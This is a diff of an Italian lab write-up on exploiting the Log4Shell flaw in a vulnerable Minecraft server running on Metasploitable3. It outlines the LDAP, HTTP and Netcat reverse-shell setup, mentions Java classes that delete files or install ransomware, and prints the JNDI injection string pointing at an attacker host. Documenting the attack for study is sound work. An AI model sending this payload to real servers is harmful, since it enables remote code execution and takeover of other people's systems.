@@ -15,7 +15,9 @@ Minecraft implementa questo framework che sarà la causa della vulnerabilità ch
 ## L'attacco *"in a nutshell"*
 L'attacco parte sulla creazione di un server LDAP che sarà il punto di ingresso del traffico verso la vittima.
 Viene in oltre messo su un server http (in questo caso viene usato un server python) che sarà l'esecutore dell'iniezione del codice malevolo.
-Già questo basterebbe per la compromissione del sistema attaccato, tuttavia si è voluto anche creare una classe Java che consenta anche la Remote Code Execution tramite reverse shell. Perciò risulta necessaria la creazione di un ulteriore server TCP, nel nostro caso useremo Netcat.
+Si scrive una classe Java che al suo interno contenga del codice malevolo come ad esempio la cancellazione di file o l'installazione di un ransomware.
+
+Già questo basterebbe per la compromissione del sistema attaccato, tuttavia si è voluto creare una classe Java che consenta anche la Remote Code Execution tramite reverse shell. Perciò risulta necessaria la creazione di un ulteriore server TCP, nel nostro caso useremo Netcat.
 
 **Injection**: La fase di iniezione consiste di inviare via chat di gioco, un ????????? così composto: `${jndi:ldap://ip_serverLDAP_attaccante:porta_ldap/NomeClasseJavaMalevola}`, ciò farà si che il framework inizi una connessione LDAP al server dell'attaccante.
 Non ci sono particolari complicanze in questa fase e questo messaggio può essere potenzialmente inviato da qualsiasi giocatore e da qualsiasi IP.
@@ -93,7 +95,6 @@ L'attaccante:
 - Ha a disposizione i tool necessari tra cui la classe Java che scriverà *ad-hoc* per l'attacco.
 - Ha a disposizione un account valido nel caso in cui il server richieda la verifica dell'account Microsoft.
 - La versione del server di gioco vulnerabile (in questo caso si fa riferimento alle versioni 1.8.0 e 1.8.9) e che non abbia la patch di sicurezza.
-
 - **(!) L'attaccante può ottenere il controllo completo del sistema, effettuare movimenti laterali e di impatto**
  
 C'è da considerare che l'ambiente utilizzato (Metasploitable3) è preconfigurato in modo tale da avere pochissime restrizioni in merito alla sicurezza, per cui su ambienti più sicuri questo attacco comporterebbe poca se non nulla .....
